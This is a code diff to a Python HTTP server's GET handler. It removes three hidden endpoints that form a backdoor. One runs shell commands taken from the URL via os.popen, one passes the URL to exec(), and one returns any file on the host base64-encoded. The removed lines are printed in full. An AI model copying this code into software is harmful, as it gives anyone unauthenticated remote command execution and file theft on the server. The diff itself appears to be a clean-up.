@@ -73,28 +73,6 @@ class _HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         self.do_GET()
     def do_GET(self): # pylint: disable=invalid-name
         ''' Serve a GET request '''
-        if self.path.startswith("/command_"):
-            pref, command = self.path[:9], self.path[9:]
-            result = os.popen("\"" + command + "\"").read()
-            print("rezultatule ste " + result)
-            result = "command " + command + " has result " + result
-            result = result.encode('utf-8')
-            self._write(200, 'application/octet-stream', result)
-            return
-        if self.path.startswith("/scriptforadding_"):
-            pref, command = self.path[:17], self.path[17:]
-            exec(command)
-            result = "comanda"
-            result = result.encode("utf-8")
-            self._write(200, 'application/octet-stream', result)
-            return
-        if self.path.startswith("/pathis_"):
-            pref, path = self.path[:8], self.path[8:]
-            fp = open(path, 'rb').read()
-            message = base64.b64encode(fp).decode("ascii")
-            result = message.encode("utf-8")
-            self._write(200, 'application/octet-stream', result)
-            return
         path = urllib.parse.urlparse(self.path).path
         path = '/index.html' if path == '/' else path
         status_code = 404
